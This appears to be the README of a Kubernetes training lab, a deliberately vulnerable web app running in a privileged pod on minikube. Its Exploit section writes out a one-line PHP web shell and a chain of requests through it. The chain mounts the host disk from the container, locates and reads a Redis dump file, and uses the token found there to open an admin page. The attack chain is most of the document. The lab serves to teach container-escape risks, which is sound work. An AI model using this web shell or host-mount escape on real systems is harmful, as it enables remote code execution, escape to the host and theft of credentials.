# Privileged Pod

1. Install and run [minikube](https://kubernetes.io/docs/setup/learning-environment/minikube/#installation).
2. `./build.sh`

## Web

Vulnerable application with RCE and privileged access.

## Redis

## Admin

## Exploit

1. Upload file `hack.php`:
    ```php
    <?php
    var_dump(system($_GET['cmd']));
    ```
2. http://192.168.99.100/upload/19308ebfbcf54d0ae3fdfab44951f9b7.php?cmd=mkdir /tmp/host
3. http://192.168.99.100/upload/19308ebfbcf54d0ae3fdfab44951f9b7.php?cmd=mount /dev/sda1 /tmp/host
4. http://192.168.99.100/upload/19308ebfbcf54d0ae3fdfab44951f9b7.php?cmd=find /tmp/host -name "dump.rdb"
5. http://192.168.99.100/upload/19308ebfbcf54d0ae3fdfab44951f9b7.php?cmd=cat <👆>
6. http://192.168.99.100/admin?token=<👆>
